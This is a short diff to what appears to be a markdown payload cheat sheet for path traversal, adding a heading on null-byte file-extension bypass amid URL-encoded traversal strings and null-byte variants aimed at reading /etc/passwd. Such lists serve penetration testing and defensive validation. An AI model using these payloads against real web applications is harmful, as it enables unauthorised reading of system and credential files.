@@ -34,6 +34,9 @@ ___
 %2Fetc%2Fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd
+```
+#### File extension with null byte bypass
+```
 /etc/passwd%00
 ../../../etc/passwd%00
 ..//..//..//..//etc/passwd%00
